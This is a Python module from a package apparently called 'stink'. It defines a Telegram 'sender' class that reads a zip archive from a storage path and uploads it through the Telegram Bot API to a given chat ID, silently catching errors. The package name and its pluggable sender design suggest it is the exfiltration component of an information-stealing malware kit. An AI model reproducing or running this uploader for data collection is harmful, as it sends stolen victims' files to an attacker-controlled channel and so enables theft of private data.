from os import path
from typing import Tuple, Union
from urllib.request import Request, urlopen

from stink.helpers import MultipartFormDataEncoder
from stink.utils.senders.abstract import AbstractSender


class Telegram(AbstractSender):
    """
    Sender for the Telegram.
    """
    def __init__(self, token: str, user_id: int):
        super().__init__()

        self.__token = token
        self.__user_id = user_id

    def __get_sender_data(self) -> Tuple[Union[str, bytes], ...]:
        """
        Gets data to send.
        :return: (str|bytes, ...)
        """
        with open(path.join(path.dirname(self.__storage_path), rf"{self.__zip_name}.zip"), "rb") as file:
            content_type, body = MultipartFormDataEncoder().encode(
                [("chat_id", self.__user_id)],
                [("document", f"{self.__zip_name}.zip", file)]
            )

        file.close()

        return content_type, body, f"https://api.telegram.org/bot{self.__token}/sendDocument"

    def __send_archive(self) -> None:
        """
        Sends the data.
        :return: None
        """
        content_type, body, link = self.__get_sender_data()
        query = Request(method="POST", url=link, data=body)

        query.add_header("User-Agent", self._config.UserAgent)
        query.add_header("Content-Type", content_type)

        urlopen(query)

    def run(self, zip_name: str, storage_path: str) -> None:
        """
        Launches the sender module.
        :param zip_name: str
        :param storage_path: str
        :return: None
        """
        self.__zip_name = zip_name
        self.__storage_path = storage_path

        try:

            self.__send_archive()

        except Exception as e:
            print(f"[Telegram sender]: {repr(e)}")
